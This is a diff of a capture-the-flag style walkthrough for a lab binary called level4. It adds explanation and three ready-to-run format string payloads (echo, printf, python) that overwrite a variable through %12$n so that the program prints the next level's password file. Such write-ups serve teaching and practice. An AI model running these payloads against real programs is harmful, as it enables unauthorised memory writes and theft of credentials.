@@ -20,13 +20,17 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 ## Solution
 
-The same as level3
+The main principle is the same as in the [level3](./../level3/walkthrough.md), but `m` here should be equal to `0x1025544`  (`16930116` in decimal), so we just need to make a huge padding... 
 
+As the program will call `system("/bin/cat /home/user/level5/.pass")`, we don't need to keep stdin opened, and that makes solution even more simple:
+
+```bash
 echo -n $'\x10\x98\x04\x08%16930112c%12$n' | ./level4
-
+# or
 printf '\x10\x98\x04\x08%%16930112c%%12$n' | ./level4
-
+# or
 python -c 'print "\x10\x98\x04\x08%16930112c%12$n"' | ./level4
+```
 
 ## References
-https://owasp.org/www-community/attacks/Format_string_attack
+- [OWASP - format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
